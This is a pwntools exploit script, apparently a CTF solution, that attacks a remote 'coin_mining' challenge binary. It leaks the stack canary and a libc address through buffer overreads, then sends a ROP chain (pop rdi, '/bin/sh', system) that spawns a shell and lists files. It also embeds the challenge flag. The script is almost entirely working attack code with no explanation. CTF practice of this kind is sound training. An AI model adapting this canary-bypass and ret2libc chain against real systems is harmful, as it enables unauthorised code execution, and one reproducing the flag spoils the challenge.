from pwn import *
libc = ELF("./libc.so.6")
context.binary = "./coin_mining"
#context.log_level = "debug"

gdbscripter = '''
break *printf
set backtrace past-entry
'''
#s = gdb.debug("./coin_mining", gdbscript = gdbscripter)
s = remote("coin-mining-01a74ac89ed12715.chall.ctf.blackpinker.com", 443, ssl = True)
#s = process(executable = "./coin_mining", argv = [])
s.sendlineafter(b"Greet, do you want some coin? \n", b"1")
#s.sendlineafter(b"Greet, do you want some coin? \n", b"2")


payload = b"a"*(0x90 - 7) 
s.sendafter(b"Guess what coin I will give you: ", payload)
s.recvuntil(payload)
canary = s.recv(7)
print("canary :", canary[::-1].hex())
print(len(canary))


payload = b"a"*0x90 + b"aaaaaaaa"

ret_instruction_addr = 0x0000000000021b97
s.sendafter(b"Try again: ", payload)
s.recvuntil(payload)

addr = int.from_bytes(s.recv(6), "little")
print("leak address:", hex(addr))
libc_base = addr - ret_instruction_addr

pop_rdi = p64(0x000000000002155f + libc_base)
bin_sh = p64(libc_base + 0x1b3e9a)

system = p64(libc.symbols["system"] + libc_base)
ret = p64(0x000000000004f46c + libc_base)

payload = b"a"*(0x90 - 8) + b"\x00" + canary + b"aaaaaaaa" + pop_rdi + bin_sh + ret +  system
s.sendafter(b"Try again: ", payload)
s.sendafter(b"Try again: ", b"notHMCUS-CTF{a_coin_must_be_here}\n\x00")
s.recvuntil(b"Well done! Here is your coin!\n")
s.sendline(b"ls")
s.interactive()